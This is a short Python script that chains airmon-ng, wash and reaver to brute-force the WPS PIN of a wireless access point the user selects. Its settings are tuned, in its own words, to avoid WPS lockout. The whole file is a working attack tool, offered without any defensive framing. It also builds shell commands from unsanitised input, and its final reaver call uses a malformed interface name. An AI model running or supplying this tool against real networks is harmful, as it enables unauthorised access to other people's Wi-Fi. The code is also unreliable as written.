#!/usr/bin/python
import os

os.system("clear")
os.system("airmon-ng check kill")
os.system("iwconfig")
WLANinput=raw_input("\nEnter your adapter NUMBER (ie \'0\' for wlan0):")
os.system("airmon-ng start " + "wlan"+WLANinput)
os.system("clear")
os.system("echo PRESS Control+C when your done looking")
os.system("wash -i " + "wlan"+WLANinput+"mon")
MACinput=raw_input("\nEnter MAC Address for Accesspoint:")
os.system("clear")
# THIS IS GOING TO BE LOW AND SLOW IOT AVOID LOCKING WPS IF POSSIBLE. IF YOUR TESTING WPS USE OFFLINE SCRIPT SLICK
os.system("reaver -i " + WLANinput+"mon" + " -b " + MACinput + " -d 45 -S -N -W -vv -l 60 -x 10 -r 5")
